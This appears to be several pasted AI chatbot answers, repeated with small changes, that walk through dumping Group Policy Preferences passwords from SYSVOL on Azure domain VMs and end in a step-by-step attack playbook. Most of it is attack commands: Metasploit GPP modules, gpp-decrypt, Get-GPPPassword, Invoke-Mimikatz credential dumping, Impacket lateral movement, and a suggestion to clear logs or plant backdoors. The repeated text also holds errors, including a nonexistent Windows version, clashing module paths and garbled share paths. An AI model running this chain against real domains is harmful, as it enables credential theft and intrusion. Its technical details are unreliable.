Credential dumping with group policy

## with group policy

Sure! Here's a cleaned-up, detailed, and well-structured summary of **Credential Dumping with Group Policy Preferences (GPP)** pentesting on Azure Windows/Linux VMs targeting Local accounts, AD accounts, and Microsoft Entra ID accounts. I've removed duplicates, added context, detailed steps, commands, and highlighted relevant Azure VM vulnerabilities.

------------------------------------------------------------------------

**Credential Dumping with Group Policy Preferences (GPP) on Azure VMs**

**Overview**

**Group Policy Preferences (GPP)** allow Windows administrators to configure a variety of system and application settings, including creating local user accounts and setting passwords. However, GPP stores certain sensitive information (like passwords) in SYSVOL in an *encrypted* but easily decryptable form. This vulnerability can be exploited to extract credentials of local or domain accounts.

------------------------------------------------------------------------

**Why is GPP Dangerous?**

- GPP stores passwords in XML files inside the SYSVOL share on Domain Controllers.

- The encryption used by GPP is weak and can be decrypted offline using public tools.

- Attackers with read access to SYSVOL (often accessible by any domain user) can dump these credentials.

- Exploiting GPP can reveal plaintext or decryptable passwords for local accounts, domain accounts, and service accounts.

------------------------------------------------------------------------

**Lab Setup Requirements**

- Azure environment with:

  - A **Domain Controller VM** (Windows Server with Active Directory Domain Services)

  - One or more **Domain-joined Windows VMs**

  - Network configured for internal communication (VNET/subnet allowing SMB access)

- A client machine or attacker VM with tools like **Metasploit, PowerShell, gpp-decrypt** utility

------------------------------------------------------------------------

**Step-by-Step Pentest Process**

**1. Creating a GPP User Account on the Domain Controller**

This is typically the *vulnerable configuration* to find and exploit:

- Use Group Policy Management Console (GPMC) on Domain Controller

- Navigate to:\
  User Configuration -\> Preferences -\> Control Panel Settings -\> Local Users and Groups

- Create a new local user with a password stored in the GPP XML files

- The password is encrypted using a **hardcoded AES key**, reversible with public tools

------------------------------------------------------------------------

**2. Locating GPP XML Files (SYSVOL share)**

- Connect to the Domain Controller’s SYSVOL share to find XML files containing passwords:

net view \\\<domain-controller-ip\>\SYSVOL

- Look inside:

\\\<domain-controller-ip\>\SYSVOL\\domain\>\Policies\\GUID}\Machine\Preferences\Groups\Groups.xml

or

\\\<domain-controller-ip\>\SYSVOL\\domain\>\Policies\\GUID}\User\Preferences\Groups\Groups.xml

- These XML files contain encrypted passwords for the accounts created or managed by GPP.

**3. Extracting and Decrypting Passwords**

**Tools:**

- **gpp-decrypt.py** (Python script that decrypts passwords)

- **Metasploit auxiliary/gather/gpp** modules

- **PowerShell Empire** or custom PowerShell scripts

------------------------------------------------------------------------

**Example commands:**

- Using gpp-decrypt.py:

gpp-decrypt.py Groups.xml

This will output decrypted passwords in plaintext.

------------------------------------------------------------------------

- Using Metasploit:

use auxiliary/gather/credentials/gpp

set RHOSTS \<domain-controller-ip\>

run

This automates enumeration and extraction of passwords.

------------------------------------------------------------------------

**4. Using Extracted Credentials for Lateral Movement and Privilege Escalation**

- Use credentials to **RDP/WinRM/SSH** into Azure Windows/Linux VMs

- Dump additional credentials with tools like **Mimikatz**

- Escalate privileges locally or in AD (if domain accounts are compromised)

- Use compromised accounts to pivot or perform persistence

------------------------------------------------------------------------

**5. Additional Techniques and Tools**

- **GP3finder** — Tool for scanning SYSVOL shares for vulnerable GPP files

- **PowerShell Empire** — For running post-exploitation commands remotely using the compromised credentials

- **Windows PowerShell** — Native scripts to query SYSVOL and decrypt GPP credentials

------------------------------------------------------------------------

**Azure VM Specific Vulnerabilities Exploited**

- **Misconfigured Domain Joined VMs:** VMs joined to the domain that have SMB/WinRM/RDP exposed internally

- **Weak or Default Local Admin Passwords:** Often set via GPP and stored insecurely

- **Overly permissive access to SYSVOL:** Allows any authenticated user or attacker with limited access to retrieve GPP files

- **Poor network segmentation:** Allows an attacker to move laterally between VMs in the same Azure VNET/subnet

- **Insufficient Azure RBAC policies:** Can lead to compromised accounts with excessive permissions

- **Lack of logging or alerting:** Makes detection of GPP exploitation difficult

------------------------------------------------------------------------

**Summary Table of Steps and Commands**

| **Step** | **Description** | **Command/Tool Example** |
|----|----|----|
| 1\. Identify SYSVOL Share | Enumerate SYSVOL on Domain Controller | net view \\DC-IP\SYSVOL |
| 2\. Find GPP XML files | Locate Groups.xml with encrypted passwords | Browse: \\DC-IP\SYSVOL\\domain\>\Policies\\ |
| 3\. Extract passwords | Decrypt encrypted passwords | gpp-decrypt.py Groups.xml |
| 4\. Automate with Metasploit | Use Metasploit module for GPP extraction | use auxiliary/gather/credentials/gpp |
| 5\. Use creds for access | Use extracted creds for lateral movement | rdesktop, winrm, ssh or psexec |
| 6\. Dump more credentials | Post-exploitation credential dumping | mimikatz or Invoke-Mimikatz in PowerShell |
| 7\. Persist and escalate | Create backdoors, escalate privileges | PowerShell Empire, scheduled tasks, or GPOs |

------------------------------------------------------------------------

**Final Notes**

- GPP credential dumping remains one of the **classic and easy AD attacks** if old policies have not been cleaned.

- Microsoft deprecated the use of GPP passwords after 2014; modern environments should not have vulnerable GPP accounts.

- Regularly audit and clean SYSVOL for legacy GPP files.

- In Azure, ensure proper network segmentation, least privilege, and use **Azure Defender** to detect abnormal access patterns.

- Enable logging and alerting on SYSVOL access.

------------------------------------------------------------------------

If you want, I can also provide a **full Azure-centric attack and detection playbook** with PowerShell scripts, Metasploit commands, and Azure CLI integration for this workflow. Would you like that?

Certainly! Here’s a clear, corrected, and detailed summary on **how to pentest Azure Windows/Linux VMs for local accounts, AD accounts, and Microsoft Entra ID accounts via Credential Dumping with Group Policy Preferences (GPP)** — covering every step, commands, and relevant Azure VM vulnerabilities, with duplicates removed.

------------------------------------------------------------------------

**Credential Dumping with Group Policy Preferences (GPP) on Azure VMs**

------------------------------------------------------------------------

**Why Using GPP to Create User Accounts is Dangerous**

- **Group Policy Preferences (GPP)** allow administrators to create local user accounts and set passwords via Group Policy.

- Passwords for these accounts are stored in **SYSVOL**, the shared folder replicated across all domain controllers.

- SYSVOL path:\
  \\\<DOMAIN\>\SYSVOL\\DOMAIN\>\Policies\\GPO-GUID}\Machine\Preferences\Groups\Groups.xml

- Passwords are encrypted with a **known AES key**, meaning **any authenticated domain user** can decrypt them easily.

- Therefore, using GPP to set local admin passwords is insecure and can be exploited to dump credentials.

------------------------------------------------------------------------

**Lab Setup Requirements**

- **Domain Controller VM:** Windows Server 2019/2022/2024 running Active Directory

- **Client VMs:** Windows 10/12 (domain-joined) and Kali Linux for attacker tools

- Network configured to allow SMB and other relevant protocols for internal communication

------------------------------------------------------------------------

**Step-by-Step Pentest Procedure**

**1. Create a Vulnerable User Account Using GPP**

- On the Domain Controller, open **Group Policy Management Console (GPMC)**

- Navigate to:\
  Computer Configuration \> Preferences \> Control Panel Settings \> Local Users and Groups

- Right-click and select: **New \> Local User**

- Create a user (e.g., username: raaz) with a password

- Save and apply the GPO update (gpupdate /force on client machines if needed)

This process creates a **Groups.xml** file inside SYSVOL containing the encrypted password (cpassword attribute).

------------------------------------------------------------------------

**2. Locate the GPP XML File Containing Passwords**

- From attacker machine or domain-joined VM, access the SYSVOL share on the Domain Controller:

net view \\\<DOMAIN-CONTROLLER-IP\>\SYSVOL

- Navigate to the Group Policy path holding preferences:

\\\<DOMAIN-CONTROLLER-IP\>\SYSVOL\\DOMAIN\>\Policies\\GPO-GUID}\Machine\Preferences\Groups\Groups.xml

- Download or view the Groups.xml file, which contains lines like:

\<cpassword\>EncryptedPasswordHere\</cpassword\>

------------------------------------------------------------------------

**3. Decrypt the Password**

- Use publicly available tools to decrypt cpassword:

**Option A: Using gpp-decrypt.py (Python script)**

gpp-decrypt.py Groups.xml

- Outputs plaintext passwords.

**Option B: Using Metasploit**

use auxiliary/gather/credentials/gpp

set RHOSTS \<DomainController-IP\>

run

- This module automates fetching and decrypting GPP passwords.

------------------------------------------------------------------------

**4. Use Extracted Credentials for Lateral Movement**

- With decrypted credentials, authenticate to Azure VMs using:

\# For Windows VMs

rdesktop \<VM-IP\> -u raaz -p \<decrypted-password\>

\# For PowerShell remoting

Enter-PSSession -ComputerName \<VM-IP\> -Credential raaz

\# For SMB access

smbclient -L //\<VM-IP\> -U raaz

- Perform further post-exploitation like:

\# On compromised VM, dump more credentials with Mimikatz

Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

------------------------------------------------------------------------

**5. Azure VM Vulnerabilities Exploited**

- **SYSVOL Permissions:**\
  Read access to SYSVOL by authenticated users exposes passwords.

- **Poor Password Storage:**\
  GPP stores passwords encrypted with a static key, not secure.

- **Network Exposure:**\
  Azure VMs in the same virtual network or subnet allow lateral movement.

- **Weak Azure RBAC and NSG Rules:**\
  Lack of proper network security groups or role restrictions lets attackers move across resources.

- **Insufficient Monitoring:**\
  No alerting on abnormal SYSVOL access or GPP exploitation.

------------------------------------------------------------------------

**Summary Table**

| **Step** | **Description** | **Command/Tool Example** |
|----|----|----|
| 1\. Create GPP User | Via GPMC, create local user with password | GUI in Domain Controller |
| 2\. Access SYSVOL | Access Group.xml containing cpassword | net view \\\<DC-IP\>\SYSVOL |
| 3\. Decrypt Password | Use tools to decrypt cpassword | gpp-decrypt.py Groups.xml or Metasploit |
| 4\. Lateral Movement | Use credentials to access Azure VMs | rdesktop, Enter-PSSession, smbclient |
| 5\. Post-exploitation | Dump more creds or escalate privileges | Invoke-Mimikatz, PowerShell Empire |

------------------------------------------------------------------------

**Important Recommendations**

- **Do not use GPP for password storage anymore.** Microsoft deprecated this in 2014.

- Regularly audit SYSVOL for legacy GPP XML files.

- Use **Azure Defender** and monitoring tools to alert on suspicious SYSVOL access.

- Apply **least privilege principles** and network segmentation in Azure environments.

- Rotate local admin passwords and enforce strong policies.

------------------------------------------------------------------------

If you want, I can prepare a detailed automated pentesting playbook with exact commands, PowerShell scripts, and Azure CLI steps for this attack vector. Just ask!

Certainly! Here’s a cleaned-up, concise, and detailed summary of **how to pentest Azure Windows/Linux VMs for Local accounts, AD accounts, and Microsoft Entra ID accounts via Credential Dumping from Group Policy Preferences (GPP)** — including detailed steps, commands, exploited vulnerabilities, and multiple exploitation methods without duplicates.

------------------------------------------------------------------------

**Pentesting Credential Dumping via Group Policy Preferences (GPP) on Azure VMs**

------------------------------------------------------------------------

**Background: Why GPP Credentials Are Vulnerable**

- Group Policy Preferences (GPP) can create local/domain users and set passwords via Group Policy.

- Passwords are stored encrypted in XML files (Groups.xml) inside **SYSVOL** folder on Domain Controllers.

- SYSVOL is readable by **any authenticated domain user**.

- Passwords are encrypted with a **known static AES key**, making them easy to decrypt.

- This weakness allows attackers to **dump plaintext passwords** from GPP XML files remotely or locally.

------------------------------------------------------------------------

**Lab Setup**

- Domain Controller: Windows Server 2019/2022/2024 (Active Directory enabled)

- Client Machines: Windows 10/12 domain-joined

- Attacker Machine: Kali Linux (with Metasploit, PowerShell Empire, and other tools)

- Network: VMs in Azure with SMB accessible internally

------------------------------------------------------------------------

**Step 1: Exploit GPP via Metasploit SMB Enumeration (Remote)**

- **Prerequisite:** Know credentials of a valid domain user (e.g., raj:Ignite@123)

- Metasploit auxiliary module smb_enum_gpp enumerates GPP XML files on Domain Controller via SMB, decrypts cpassword automatically.

**Commands:**

use auxiliary/scanner/smb/smb_enum_gpp

set RHOSTS 192.168.1.103

set SMBUser raj

set SMBPass Ignite@123

exploit

- Result: Displays decrypted passwords from GPP XML files such as Groups.xml.

------------------------------------------------------------------------

**Step 2: Exploit GPP via Metasploit Post-Exploitation (Local)**

- **Prerequisite:** You have a Meterpreter session on a compromised machine inside the domain.

- Metasploit post module post/windows/gather/credentials/gpp searches cached GPP files locally and remotely.

**Commands:**

use post/windows/gather/credentials/gpp

set SESSION 1

exploit

- Result: Finds and decrypts cpassword from paths like:

  - C:\ProgramData\Microsoft\Group Policy\History\\GUID}\Machine\Preferences\Groups\Groups.xml

  - C:\Windows\SYSVOL\sysvol\\domain\>\Policies\\GUID}\Machine\Preferences\Groups\Groups.xml

------------------------------------------------------------------------

**Step 3: Manual Retrieval via SMB Client and Decrypt**

- Connect to SYSVOL share with valid credentials via SMB client:

smbclient //192.168.1.103/SYSVOL -U raj

- Navigate to the GPP XML path:

SYSVOL\sysvol\\domain\>\Policies\\GPO-GUID}\Machine\Preferences\Groups\Groups.xml

- Download Groups.xml to your local machine.

- Decrypt cpassword using:

  - **gpp-decrypt** (Ruby script in Kali Linux):

- gpp-decrypt \<encrypted-cpassword\>

- gpp-decrypt qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80

  - **gp3finder** (Python script):

- gp3finder.exe -D qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80

**Step 4: Extract via PowerShell Empire**

- Gain a low privilege shell on a Windows host inside domain.

- Use PowerShell Empire privesc/gpp module to extract plaintext GPP passwords.

**Commands in Empire:**

agents

interact \<agent_name\>

usemodule privesc/gpp

execute

- Result: Displays plaintext passwords from GPP XML files.

------------------------------------------------------------------------

**Step 5: Extract via PowerShell Script (PowerSploit)**

- Use PowerSploit module Get-GPPPassword.ps1 locally on a domain controller or domain-joined machine.

**Commands:**

Import-Module .\Get-GPPPassword.ps1

Get-GPPPassword

- Output: Lists plaintext passwords from XML files such as Groups.xml, ScheduledTasks.xml, Services.xml, etc.

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- **SYSVOL Accessible by Authenticated Users:** Default permission allows any authenticated user to read GPP XML files.

- **Static AES Encryption Key:** Microsoft’s fixed AES key for cpassword encryption makes stored passwords trivial to decrypt.

- **Network Exposure of SMB Ports:** Azure VMs often allow SMB traffic internally, enabling remote enumeration.

- **Cached Group Policy Files:** Cached on endpoints, allowing local extraction even if GPO deleted.

- **Lack of Monitoring:** No alerts on suspicious SYSVOL access or lateral movement using dumped credentials.

- **Weak Password Hygiene:** Passwords may be reused or weak, facilitating further compromise.

------------------------------------------------------------------------

**Summary Table of Tools and Commands**

| **Method** | **Prerequisite** | **Commands / Tool** | **Purpose** |
|----|----|----|----|
| Metasploit SMB Enumerator | Valid domain user creds | auxiliary/scanner/smb/smb_enum_gpp | Remote GPP XML enumeration & decryption |
| Metasploit Post Exploit | Meterpreter session | post/windows/gather/credentials/gpp | Local and remote cached GPP creds |
| Manual SMB + Decrypt | Valid SMB creds | smbclient + gpp-decrypt / gp3finder | Manual file download + decrypt |
| PowerShell Empire | Low privilege shell | Empire privesc/gpp | Extract GPP creds via PS |
| PowerSploit PowerShell Script | Local PowerShell access | Import-Module Get-GPPPassword.ps1 + Get-GPPPassword | Extract plaintext creds locally |

------------------------------------------------------------------------

If you want, I can prepare a fully automated pentest playbook for Azure environments including lateral movement and privilege escalation after dumping GPP credentials. Just ask!

Great! Here’s a **detailed, step-by-step automated pentest playbook** for exploiting **Group Policy Preferences (GPP) credential dumping** in an Azure environment covering **Windows AD Domain Controllers, domain-joined Windows VMs, and local accounts**.

------------------------------------------------------------------------

**Azure Windows VM Pentest Playbook: Credential Dumping via Group Policy Preferences (GPP)**

------------------------------------------------------------------------

**Objective**

- Enumerate and dump local and domain user passwords stored insecurely in GPP on Domain Controllers and domain-joined Windows VMs.

- Use dumped credentials for lateral movement, privilege escalation, and further domain compromise.

------------------------------------------------------------------------

**Prerequisites**

- Access to Azure environment with target Windows VMs and Domain Controller.

- Valid domain user credentials or a low-privilege shell on a domain-joined machine.

- Kali Linux or similar attacker system with tools installed:

  - Metasploit Framework

  - PowerShell Empire or equivalent

  - smbclient

  - gpp-decrypt or gp3finder

  - PowerSploit Get-GPPPassword.ps1

------------------------------------------------------------------------

**Phase 1: Initial Access & Recon**

**1.1 Validate SMB Access to Domain Controller SYSVOL**

smbclient //\<DC_IP\>/SYSVOL -U \<domain_user\>

\# Example:

smbclient //192.168.1.103/SYSVOL -U raj

- Confirm you can list files under:

/sysvol/\<domain\>/Policies/{GPO_GUID}/Machine/Preferences/Groups/Groups.xml

------------------------------------------------------------------------

**1.2 Enumerate GPP XML Files via Metasploit SMB Enumeration**

msfconsole

use auxiliary/scanner/smb/smb_enum_gpp

set RHOSTS \<DC_IP\>

set SMBUser \<domain_user\>

set SMBPass \<password\>

run

- Output: Decrypted cpassword strings for accounts created or modified via GPP.

------------------------------------------------------------------------

**Phase 2: Local Exploitation & Credential Dumping**

**2.1 Gain a Low-Privilege Shell on a Domain-Joined Machine**

- Use any known exploitation or valid creds to get Meterpreter or PowerShell shell.

------------------------------------------------------------------------

**2.2 Extract Cached GPP Credentials Using Metasploit Post Module**

use post/windows/gather/credentials/gpp

set SESSION \<meterpreter_session_id\>

run

- Output: Decrypted cpassword entries from cached Group Policy files locally.

------------------------------------------------------------------------

**2.3 Manually Retrieve and Decrypt GPP XML Files**

\# From attacker machine:

smbclient //\<DC_IP\>/SYSVOL -U \<domain_user\>

\# Download Groups.xml

cd sysvol/\<domain\>/Policies/{GPO_GUID}/Machine/Preferences/Groups/

get Groups.xml

\# Decrypt cpassword

gpp-decrypt \<encrypted_cpassword\>

\# or

gp3finder.exe -D \<encrypted_cpassword\>

------------------------------------------------------------------------

**2.4 Use PowerShell Empire Module**

\# In Empire:

usemodule privesc/gpp

execute

- Retrieves plaintext passwords pushed through GPP.

------------------------------------------------------------------------

**2.5 Run PowerSploit's Get-GPPPassword.ps1 Locally**

Import-Module .\Get-GPPPassword.ps1

Get-GPPPassword

- Finds plaintext passwords from all relevant GPP XML files.

------------------------------------------------------------------------

**Phase 3: Post-Exploitation — Lateral Movement & Privilege Escalation**

**3.1 Use Dumped Credentials for Lateral Movement**

- Use wmiexec.py or psexec.py (Impacket) with dumped creds to move laterally.

python wmiexec.py \<domain\>/\<user\>:\<password\>@\<target_IP\>

------------------------------------------------------------------------

**3.2 Check for Privileges and Escalate**

- Use PowerShell or Metasploit to enumerate privileges.

- Attempt privilege escalation with available exploits or misconfigurations.

------------------------------------------------------------------------

**Phase 4: Cleanup & Persistence (Optional)**

- Clear logs or plant backdoors as needed, respecting your engagement scope.

------------------------------------------------------------------------

**Additional Recommendations for Azure Pentesting**

- Check Azure NSG and firewall rules for SMB port (445) exposure.

- Use Azure Run Command or Custom Script Extensions to run scripts remotely on VMs.

- Use Microsoft Defender for Cloud to monitor SYSVOL access or unusual SMB traffic.

- Consider exploiting cached GPP files on domain-joined endpoints.

------------------------------------------------------------------------

**Summary**

| **Step** | **Commands/Tools** | **Notes** |
|----|----|----|
| Validate SYSVOL Access | smbclient //DC_IP/SYSVOL -U user | Confirm readable GPP XML files |
| Metasploit SMB Enumeration | auxiliary/scanner/smb/smb_enum_gpp | Remote dump & decrypt cpasswords |
| Meterpreter Post Exploit | post/windows/gather/credentials/gpp | Local cached GPP creds |
| Manual SMB Download & Decrypt | smbclient + gpp-decrypt or gp3finder | Manual extraction & decryption |
| PowerShell Empire Module | privesc/gpp | Powershell-based credential extraction |
| PowerSploit Get-GPPPassword | Import-Module Get-GPPPassword.ps1; Get-GPPPassword | Local powershell script to dump creds |
| Lateral Movement | wmiexec.py, psexec.py Impacket tools | Use dumped creds for lateral access |

------------------------------------------------------------------------

If you want, I can generate automation scripts (Bash, PowerShell) that chain these steps to speed up your pen testing workflow on Azure. Would you like me to prepare those?
